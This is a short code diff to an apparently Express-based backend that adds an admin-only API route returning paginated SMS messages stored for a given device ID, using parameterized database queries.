@@ -262,6 +262,30 @@ router.get('/connections', adminAuth, (req, res) => {
   }
 });
 
+// GET /api/admin/connections/:deviceId/sms — get SMS for a device
+router.get('/connections/:deviceId/sms', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 100;
+    const offset = (page - 1) * limit;
+
+    const total = db.prepare('SELECT COUNT(*) as count FROM sms_messages WHERE device_id = ?').get(deviceId);
+    const messages = db.prepare(
+      'SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
+    ).all(deviceId, limit, offset);
+
+    res.json({
+      messages,
+      total: total ? total.count : 0,
+      page,
+      totalPages: Math.ceil((total ? total.count : 0) / limit),
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // POST /api/admin/login
 router.post('/login', (req, res) => {
   try {
